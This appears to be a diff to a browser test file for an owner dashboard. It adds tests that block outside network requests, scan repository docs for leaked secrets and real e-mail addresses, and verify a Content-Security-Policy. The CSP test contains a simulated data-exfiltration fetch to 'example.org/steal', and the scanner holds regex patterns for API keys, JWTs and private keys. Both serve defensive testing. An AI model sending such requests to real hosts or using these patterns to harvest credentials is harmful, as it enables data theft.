@@ -2,7 +2,7 @@
 // and the test data contains nothing real.
 const fs = require('fs');
 const path = require('path');
-const { test, expect, login } = require('../helpers/dashboard');
+const { test, expect, login, gotoPage } = require('../helpers/dashboard');
 const { SUPABASE_HOST } = require('../helpers/mock-supabase');
 
 const TESTS_DIR = path.resolve(__dirname, '..');
@@ -26,8 +26,13 @@ test('requests to the production Supabase address are answered by the mock', asy
   expect(backend.requests.some(r => r.table === 'tasks')).toBe(true);
 });
 
+test.describe('mock blocking layer', () => {
+  // Every page now has a Content-Security-Policy (EXT8), which refuses these
+  // addresses in the browser before the mock sees them (csp.spec.js). This
+  // test proves the mock's own second layer, so the policy is bypassed here.
+  test.use({ bypassCSP: true });
 test('any other internet address is blocked', async ({ page, backend }) => {
-  await page.goto('/owner-login.html');
+  await page.goto('/change-password.html');
   const outcomes = await page.evaluate(async () => {
     const urls = ['https://example.com/', 'https://api.github.com/', 'https://admin.shopify.com/', 'https://gmail.googleapis.com/'];
     const out = [];
@@ -39,6 +44,7 @@ test('any other internet address is blocked', async ({ page, backend }) => {
   expect(outcomes).toEqual(['blocked', 'blocked', 'blocked', 'blocked']);
   expect(backend.blocked).toHaveLength(4);
   backend.blocked.length = 0; // expected in this test only
+});
 });
 
 test('the dashboard only ever talks to the mock during a full session', async ({ page, backend }) => {
@@ -70,4 +76,55 @@ test('test files contain no real secrets or real contact details', () => {
       expect(email.endsWith('.test'), `${path.relative(TESTS_DIR, file)} has a non-synthetic email ${email}`).toBe(true);
     }
   }
+});
+
+// SE-10 / CI-05 (2026-10-06): the repository is public, so the documents,
+// SQL drafts and helpers must not contain secrets or real contact details
+// either. (The dashboard pages are not scanned for tokens: they carry the
+// public anon key on purpose.) Placeholder addresses are allowed.
+test('docs, SQL drafts and helpers contain no secrets or real e-mail addresses', () => {
+  const ROOT = path.resolve(__dirname, '..', '..');
+  const files = [
+    ...listFiles(path.join(ROOT, 'docs')),
+    ...listFiles(path.join(ROOT, 'assets')).filter(f => f.endsWith('.js') || f.endsWith('.css')),
+    ...fs.readdirSync(ROOT).filter(f => f.endsWith('.md')).map(f => path.join(ROOT, f)),
+  ].filter(f => /\.(md|sql|sh|py|js|css|txt|draft)$/.test(f));
+  expect(files.length).toBeGreaterThan(20);
+  const secrets = [
+    /sb_secret_[A-Za-z0-9]/,
+    /shpat_[0-9a-f]{8}/i,
+    /sk_live_[A-Za-z0-9]{8}/,
+    /eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}/,
+    /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
+    /[a-z0-9]{20}\.supabase\.co/,   // a real project host
+  ];
+  const allowedEmail = /(@example\.(test|com|org)|\.test$|^noreply@anthropic\.com$|@google\.com$|^\[email\]$)/i;
+  const emailPattern = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g;
+  const problems = [];
+  for (const file of files) {
+    const text = fs.readFileSync(file, 'utf8');
+    const rel = path.relative(ROOT, file);
+    for (const re of secrets) if (re.test(text)) problems.push(`${rel} matches ${re}`);
+    for (const email of text.match(emailPattern) || []) if (!allowedEmail.test(email)) problems.push(`${rel} has e-mail ${email}`);
+  }
+  expect(problems).toEqual([]);
+});
+
+// F3-14 (EXT3): Content-Security-Policy on the owner dashboard.
+test('the dashboard has a Content-Security-Policy, shows no violations in normal use, and blocks other sites', async ({ page, backend }, testInfo) => {
+  test.skip(testInfo.project.name !== 'desktop', 'run once');
+  const violations = [];
+  await page.exposeFunction('__cspViolation', v => violations.push(v));
+  await page.addInitScript(() => document.addEventListener('securitypolicyviolation', e => window.__cspViolation(e.violatedDirective + ' ' + e.blockedURI)));
+  await login(page);
+  for (const id of ['ordersPanel', 'inventoryPanel', 'accountingPanel', 'documentsPanel', 'calendarPanel']) await gotoPage(page, id);
+  await page.waitForLoadState('networkidle');
+  expect(violations, 'normal use triggers no policy violation').toEqual([]);
+  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
+  expect(csp).toContain("connect-src 'self' https://uizrazyehilyzmwttsrn.supabase.co");
+  expect(csp).toContain("object-src 'none'");
+  // A request to any other site is refused by the browser itself.
+  const result = await page.evaluate(() => fetch('https://example.org/steal?x=1').then(() => 'sent', () => 'blocked'));
+  expect(result).toBe('blocked');
+  expect(violations.some(v => v.startsWith('connect-src') && v.includes('example.org'))).toBe(true);
 });
